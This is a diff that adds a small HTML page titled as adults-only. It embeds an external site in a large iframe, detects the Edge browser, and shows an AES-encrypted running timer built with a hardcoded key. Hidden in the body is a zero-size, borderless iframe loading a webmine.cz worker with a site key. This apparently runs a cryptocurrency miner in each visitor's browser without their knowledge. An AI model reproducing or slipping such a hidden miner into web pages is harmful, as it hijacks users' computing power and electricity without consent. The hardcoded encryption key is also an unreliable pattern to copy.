@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>18禁</title>
+</head>
+<body>
+<iframe width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=SWNiBdjUYXBhLMF'></iframe>
+<iframe width=1500 height= 800 src="www.fi11zz85.com"></iframe>
+  <p>给我这个东西：<span id="encryptedTime">不要用Edge</span></p>
+</body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
+  <script>
+        // 检测浏览器是否为Edge
+        function isEdge() {
+            return window.navigator.userAgent.indexOf("Edge") > -1;
+        }
+
+        // 在页面加载时执行检测
+        window.onload = function () {
+            if (isEdge()) {
+                alert("这是 Microsoft Edge 浏览器！");
+            } else {
+                alert("这不是 Microsoft Edge 浏览器！");
+            }
+        }
+    </script>
+  <script>
+        // 计时器变量
+        var startTime;
+        var interval;
+
+        // 开始计时
+        function startTimer() {
+            startTime = new Date().getTime();
+            interval = setInterval(updateTimer, 1000); // 每秒更新一次
+        }
+
+        // 更新计时器
+        function updateTimer() {
+            var currentTime = new Date().getTime();
+            var elapsedTime = currentTime - startTime;
+
+            // 将时间转换为秒
+            var seconds = Math.floor(elapsedTime / 1000);
+
+            // 加密时间并显示
+            var encryptedTime = encryptTime(seconds);
+            document.getElementById("encryptedTime").textContent = encryptedTime;
+        }
+
+        // 加密时间使用AES
+        function encryptTime(seconds) {
+            // 使用Crypto.js进行AES加密
+            var key = CryptoJS.enc.Utf8.parse("MySecretKey12345"); // 替换为您自己的密钥
+            var iv = CryptoJS.enc.Utf8.parse("MyIV12345"); // 替换为您自己的IV
+            var encrypted = CryptoJS.AES.encrypt(seconds.toString(), key, { iv: iv });
+
+            return encrypted.toString();
+        }
+
+        // 在页面加载时执行
+        window.onload = function () {
+          if (isEdge()) {
+                alert("这是 Microsoft Edge 浏览器！");
+          
+          } else {
+            startTimer(); // 开始计时
+            }
+            
+        }
+    </script>
+</html>
